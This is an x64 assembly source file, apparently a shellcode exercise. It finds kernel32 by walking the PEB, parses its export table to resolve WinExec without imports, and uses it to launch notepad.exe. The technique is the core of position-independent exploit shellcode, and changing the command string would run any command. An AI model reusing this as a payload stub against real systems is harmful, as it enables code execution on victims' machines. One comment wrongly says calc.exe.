; Parse PEB and find kernel32
;nasm -fwin64 [x64findkernel32.asm]
;ld -m i386pep -o x64findkernel32.exe x64findkernel32.obj

BITS 64
SECTION .text
global main
main:

sub rsp, 0x28                 ; 40 bytes of shadow space
and rsp, 0FFFFFFFFFFFFFFF0h   ; Align the stack to a multiple of 16 bytes
xor rcx, rcx             ; RCX = 0
mov rax, [gs:rcx + 0x60] ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr
mov rsi,[rax+0x10] ;PEB.Ldr->InMemOrderModuleList
mov rsi, [rsi]
mov rsi,[rsi]
mov rbx, [rsi+0x30] ;kernel32.dll base address
mov r8, rbx

;Code for parsing Export Address Table
mov ebx, [rbx+0x3C]           ; Get Kernel32 PE Signature (offset 0x3C) into EBX
add rbx, r8                   ; Add defrerenced signature offset to kernel32 base. Store in RBX.
mov edx, [rbx+0x88]           ; Offset from PE32 Signature to Export Address Table
add rdx, r8                   ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
mov r10d, [rdx+0x14]          ; Number of functions
xor r11, r11                  ; Zero R11 before use
mov r11d, [rdx+0x20]          ; AddressOfNames RVA
add r11, r8                   ; AddressOfNames VMA

; Loop over Export Address Table to find WinExec name

mov rcx, r10                      ; Set loop counter
kernel32findfunction: 
    jecxz FunctionNameNotFound    ; Loop around this function until we find WinExec
    xor ebx,ebx                   ; Zero EBX for use
    mov ebx, [r11+4+rcx*4]        ; EBX = RVA for first AddressOfName
    add rbx, r8                   ; RBX = Function name VMA
    dec rcx                       ; Decrement our loop by one
    mov rax, 0x00636578456E6957   ; WinExec          
    cmp [rbx], rax                ; Check if we found WinExec
	jz FunctionNameFound
    jnz kernel32findfunction
 
FunctionNameFound:  ;We found our target
   xor r11, r11
   mov r11d, [rdx+0x24]          ; AddressOfNameOrdinals RVA
   add r11, r8                   ; AddressOfNameOrdinals VMA
   ; Get the function ordinal from AddressOfNameOrdinals
   inc rcx
   mov r13w, [r11+rcx*2]         ; AddressOfNameOrdinals + Counter. RCX = counter
   ;With the function ordinal value, we can finally lookup the WinExec address from AddressOfFunctions.

; Get function address from AddressOfFunctions
   xor r11, r11
   mov r11d, [rdx+0x1c]          ; AddressOfFunctions RVA
   add r11, r8                   ; AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
   mov eax, [r11+4+r13*4]        ; Get the function RVA.
   add rax, r8                   ; Add base address to function RVA
   mov r14, rax                  ; got the address!  mov it into r14

; Call notepad
   ;xor rax, rax                   ; Zero RAX to become a null byte
   ;push rax                       ; Push the null byte to the stack
   mov rax, 0x00657865              ; add "exe" string to RAX
   push rax                       ; push RAX to stack
   mov rax, 0x2E64617065746F6E    ; Add "notepad." string to RAX.
   push rax                       ; Push RAX to stack
   mov rcx, rsp                   ; Move a pointer to calc.exe into RCX.
   xor rdx,rdx                    ; Zero RDX   
   inc rdx                        ; RDX set to 1 = uCmdShow
   sub rsp, 0x30                  ; keep stack in 16 bit alignment: 0x30 is 48 in decimal.  push=8.  We used push 2 times earlier: 48 + 8 + 8 = 64 bytes which is a multiple of 16. 
   call r14                       ; Call WinExec
   
FunctionNameNotFound:
nop
nop
int3
int3